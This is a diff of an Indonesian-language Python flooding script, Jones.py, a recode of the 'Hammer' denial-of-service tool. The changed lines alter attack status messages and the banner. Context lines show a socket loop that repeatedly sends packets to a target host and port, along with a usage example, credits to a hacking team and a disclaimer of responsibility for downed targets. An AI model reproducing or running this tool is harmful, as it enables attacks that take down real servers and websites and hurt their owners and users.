@@ -50,13 +50,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Attacking Server!--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m ==>Attacking Server!\033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91m>_Ngopi dulu slurd...\033[0m")
+				print("\033[91m>_Server Jones down!Ngopi dulu slurd...\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91m>_Server down! Web site telah Jones\033[0m")
+		print("\033[91m>_Connection! Server maybe Jonesin target! \033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -87,7 +87,7 @@ def usage():
        ╔╣║║║║║║║║║╩╗╠══║
        ╚═╝╚═╝╚╩═╝╚═╝╚══╝꧁A̫̫T̫̫T̫̫A̫̫C̫̫K̫̫I̫̫N̫̫G̫̫꧂
         ─────────────────
-        Script Ini Recode Dari Script Hammer :)
+        Bismillah dulu sebelum Attack! :)
         Saya Tidak Tanggung Jawab Atas Jonesnya Suatu Target :)
         BY:MR.3{Jones}
         #Thanks for mastah Q
@@ -95,6 +95,8 @@ def usage():
         >_P30N9
         >_KOUSUKE
         >_ANGGDYN
+        [!]Do'ain gua supaya dapet jodoh!
+        Thanks To:
         Team : BIRD ARMY SQUAD{WHITE HAT}
         cara pakai : python3 Jones.py [-s] [-p] [-t]
 	contoh : python3 Jones.py -s 192.168.0.1 -p 80 -t 135	
